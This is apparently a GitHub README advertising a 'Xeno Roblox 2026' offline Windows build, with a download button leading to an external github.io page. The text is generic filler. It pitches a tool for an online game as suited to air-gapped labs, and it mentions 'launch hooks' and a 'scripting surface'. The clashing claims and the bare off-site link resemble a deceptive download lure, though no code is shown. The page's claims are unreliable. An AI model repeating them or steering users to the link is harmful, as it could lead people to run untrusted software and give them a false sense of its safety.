<div align="center">

# 🎮 Xeno Roblox 2026: Standalone Offline Build for Windows 11

<img src="https://img.shields.io/badge/platform-windows_10%2F11-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Platform"> <img src="https://img.shields.io/badge/release-v2026.1-24292F?style=for-the-badge" alt="Release"> <img src="https://img.shields.io/badge/updated-2026--11--14-6E7781?style=for-the-badge" alt="Updated"> <img src="https://img.shields.io/badge/status-stable-2EA043?style=for-the-badge" alt="Status"> <img src="https://img.shields.io/badge/languages-12%2B-8250DF?style=for-the-badge&logo=googletranslate&logoColor=white" alt="Languages">

</div>

## 📦 Intro

This repository publishes a standalone offline Windows x64 distribution intended for the Xeno Roblox workflow, packaged as a self-contained setup for Windows 10 and 11. The bundle ships the runtime, the launcher, and the supporting configuration files needed to bring the application up on a clean machine without relying on a live installer service. Everything is versioned, hashed, and reproducible from the release page.

The deployment audience is narrow on purpose. This distribution is aimed at offline workstations, lab environments, and air-gapped machines where a reproducible install matters more than a fast one. Bandwidth-constrained sites and technicians who need identical bytes across many hosts are the primary consumers of the package.

A single Xeno Roblox on Windows deployment covers both portable and installed modes from the same archive, so operators can pick the layout that fits the host policy. The distribution is engine-agnostic with respect to driver stack and does not bundle any vendor kernel components.

## 01 · ⬇️ Download

<p align="center">
  <a href="https://amber-lance-72.github.io/xeno-roblox-desktop/">
    <picture>
      <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
      <img src="docs/buttons/installer-card.svg" alt="" width="440">
    </picture>
  </a>
</p>

<p align="center">
  <img src="docs/buttons/banner.png" alt="Xeno Roblox 2026 standalone build running on Windows 11, interface banner" width="100%">
</p>

## 02 · ✨ Features

<table>
<tr>
<td width="33%" valign="top">

**🎮 Game Runtime Bridge**

Ships the client shim and launch hooks needed to bring the runtime up on a clean host.

</td>
<td width="33%" valign="top">

**📦 Self-Contained Layout**

All runtime files, config seeds, and dependency stubs live under one decompressed folder tree.

</td>
<td width="33%" valign="top">

**🔒 SHA256 Manifest**

Every artifact in the release ships with a published hash and a signed-adjacent checksum file.

</td>
</tr>
<tr>
<td valign="top">

**💾 Portable Mode**

Run from removable media without writing to the system program directory or Windows registry.

</td>
<td valign="top">

**🛠 Scripting Workspace**

Exposes a scripting surface for launch hooks, environment overrides, and config post-processing.

</td>
<td valign="top">

**🌐 Multilingual Resources**

Twelve interface locales ship in the base package, with no online resource fetch required.

</td>
</tr>
</table>

## 03 · ⚙️ How it works

The package delivers a single compressed archive that expands into a self-contained folder tree. The installer copies the application files into the per-user program directory by default, or leaves them in place if a portable target is selected. No files are written outside the chosen install root and the user profile.

On first launch the build registers its file associations and shell hooks through the standard Windows per-user registration path. A first-run initialization step seeds the default configuration under the user profile, then prints a summary of the active paths so the operator can confirm the layout. The registration is reversible from Settings, then Apps, then Installed apps.

Day to day the build runs entirely from local disk. It does not contact a licensing endpoint, does not phone home, and does not require an active network connection after the initial retrieval. Updates are handled by fetching a newer versioned archive and running it over the existing install, which preserves user configuration and any saved project data.

Integration with Windows is limited to the shell surface: file associations, an optional Start menu shortcut, and the standard uninstall registration entry. The build coexists with other installations of similar software because all registration is per-user and namespaced. No system-wide services, kernel drivers, or scheduled tasks are installed.

## 04 · 🧩 Compatibility

The build targets Windows 10 and Windows 11 on x64 only. Both Home and Pro editions are supported on the current servicing baseline; Windows 10 machines should be on a build from the last two years to avoid missing runtime components. 32-bit Windows targets are not supported and will refuse to run.

The installer is driven by a PowerShell script and works on PowerShell 5.1 and later. 